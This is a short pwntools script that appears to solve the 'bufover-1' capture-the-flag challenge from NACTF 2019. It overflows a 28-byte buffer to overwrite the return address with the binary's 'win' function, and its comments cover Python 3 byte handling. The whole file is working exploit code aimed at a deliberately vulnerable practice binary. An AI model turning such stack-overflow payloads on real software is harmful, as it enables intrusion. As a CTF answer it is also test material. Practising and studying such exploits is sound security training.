#!/usr/bin/env python3
from pwn import *


context.log_level = 'critical'

ELF = context.binary = './bufover-1'
p = process(ELF)
# p = remote('shell.2019.nactf.com', 31462)

# gdb.attach(p)

# p.recvuntil('Type something>')

# We are using the latest version of pwntools for Python 3,
# where p32() returns bytes instead of a string,
# but we need to send the payload as a string,
# so we have to decode it.
# .decode('latin') is one of the decoding options that work:
payload = (
    'A' * 28
    + p32(context.binary.symbols['win']).decode('latin')
)

# NB: .stream(), .recvall() etc. also return bytes in the latest pwntools.

p.sendlineafter('Type something>', payload)
print(p.stream().decode('latin'))
p.close()  # Optional
